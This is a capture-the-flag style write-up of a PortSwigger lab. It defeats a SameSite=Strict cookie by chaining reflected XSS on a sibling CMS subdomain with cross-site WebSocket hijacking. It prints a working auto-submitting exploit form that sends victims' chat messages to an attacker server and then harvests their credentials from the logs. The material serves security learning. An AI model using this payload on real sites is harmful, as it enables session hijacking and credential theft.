# SameSite Strict bypass via sibling domain

**Category:** Cross-Site Request Forgery (CSRF)
**Difficulty:** EXPERT
**Lab:** https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain

"Site" in SameSite is a broader concept than most people assume — it's scheme plus registrable domain (eTLD+1), which means every subdomain under the same parent domain counts as the same site. SameSite=Strict blocks requests from a genuinely different site, but it does nothing to stop a request originating from a *sibling* subdomain of the very domain it's protecting. If an attacker can get script execution anywhere under that umbrella, SameSite stops being a defense at all for the rest of the site. This is the most involved lab in the series, chaining a WebSocket hijack with a reflected XSS bug on an entirely different subdomain to get there.

## The Target

The main application runs a live chat feature over WebSocket at `wss://LABID.web-security-academy.net/chat`, protected by a `SameSite=Strict` session cookie. There's also a separate, unrelated content-management subdomain at `cms-LABID.web-security-academy.net` — same parent site, different application, different login form.

## The Investigation

The chat WebSocket handshake carries no unpredictable token of its own — its only authorization is the session cookie sent during the handshake. That makes it a cross-site WebSocket hijacking (CSWSH) candidate in principle: if an attacker's page could open that WebSocket connection and have the browser attach the victim's session cookie, they could read the victim's private chat history. SameSite=Strict is exactly what blocks that under normal circumstances — a WebSocket opened from an attacker's origin is a cross-site request, so the cookie is withheld and the handshake fails authentication.

The `cms-` subdomain is where that protection falls apart. Its login form reflects the submitted username straight back into the page without escaping — but where public writeups of this lab often describe that reflection firing on a simple GET request, our own testing found the reflection was POST-only on this target instance: the injected value only appeared back in the response when submitted as a POST, surfacing inside an "Invalid username:" error message rather than through a GET-parameter echo. That distinction mattered directly for how the exploit had to be delivered — a GET-based redirect or `<img>` trick wouldn't have triggered it; the payload had to go out as an auto-submitting POST form.

Because `cms-LABID.web-security-academy.net` and `LABID.web-security-academy.net` share the same registrable domain, a script running on the CMS subdomain (via that reflected XSS) is same-site with respect to the main domain's `SameSite=Strict` cookie. A WebSocket opened from there carries the session cookie without restriction.

## The Exploit

The wrapper derives the sibling domain from the lab's own hostname (`cms-{lab_id}.web-security-academy.net`), confirms its login page responds, then builds a two-stage payload. The outer page auto-submits a POST to the CMS login form, injecting a WebSocket-hijacking script into the reflected `username` field:

```html
<html><body>
<form method="POST" action="https://cms-LABID.web-security-academy.net/login">
  <input type="hidden" name="username" value="<script>var ws=new WebSocket('wss://LABID.web-security-academy.net/chat');ws.onopen=function(){ws.send('READY');};ws.onmessage=function(e){fetch('https://EXPLOIT_SERVER/log?msg='+btoa(e.data));};</script>" />
  <input type="hidden" name="password" value="anything" />
</form>
<script>document.forms[0].submit();</script>
</body></html>
```

When the victim's browser loads this, it POSTs to the CMS login page, the injected script executes in the CMS subdomain's origin — same-site with the main domain — opens the chat WebSocket carrying the victim's Strict session cookie, sends a `READY` handshake message, and exfiltrates every incoming chat message to the attacker's exploit server as a base64-encoded query parameter via `fetch()`.

After delivering the exploit and letting it run, our `extract_credentials_from_logs()` helper pulled the exploit server's access log, decoded the `msg=` values, and pattern-matched the decoded chat text for credential phrasing — `"password is X"`, the HTML-entity-encoded `"it&apos;s X"` form, and a `"No problem <username>"` acknowledgment pattern — to recover the victim's logged chat credentials. With those in hand, logging in as the victim through the normal `/login` flow completed the lab.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's published solution follows the same overall chain: study the chat WebSocket and confirm it lacks CSRF protection, verify the CSWSH is exploitable, discover the sibling CMS subdomain (their solution finds it via an `Access-Control-Allow-Origin` header disclosed on a resource request rather than by deriving the `cms-` prefix directly), confirm the reflected XSS on the CMS login form, and chain the two to exfiltrate the victim's authenticated chat history — which is exactly the technique we used. The section headings in their solution ("Confirm the CSWSH vulnerability," "Identify an additional vulnerability in the same site," "Bypass the SameSite restrictions," "Deliver the exploit chain") match the structure of what we did step for step.

Where our path diverges from most public writeups of this lab — though we can't confirm this is a difference from PortSwigger's own official steps specifically, since their published solution didn't spell out whether their reflection fires on GET or POST — is that our target's CMS login reflection only fired on a POST submission, forcing the auto-submit form approach above rather than a simpler GET-based `<img>` or redirect trick. That's a real, concrete detail from our own testing, not an assumption.

Delivery follows the pattern of the rest of the series: PortSwigger's walkthrough is manual through Burp and the exploit server's UI; our script automates the same sequence — deliver, wait, pull logs, parse, log in.

## What This Teaches Us

SameSite cookie protection is scoped to the *site*, not the individual application running on a given hostname — which means every subdomain under that site is part of the trust boundary whether or not it was designed with that in mind. A completely unrelated CMS subdomain, built and maintained separately from the main chat application, was enough to defeat SameSite=Strict on the main domain's session cookie, because the browser has no concept of "subdomain isolation" for this purpose. This lab is also a good demonstration of chaining: neither the missing WebSocket token nor the reflected XSS was independently severe enough to reach the victim's data — the WebSocket hijack needed a same-site execution context it didn't have, and the XSS on its own was just a reflected string with no session to steal. Combined, they add up to full session hijacking of a live chat feature.
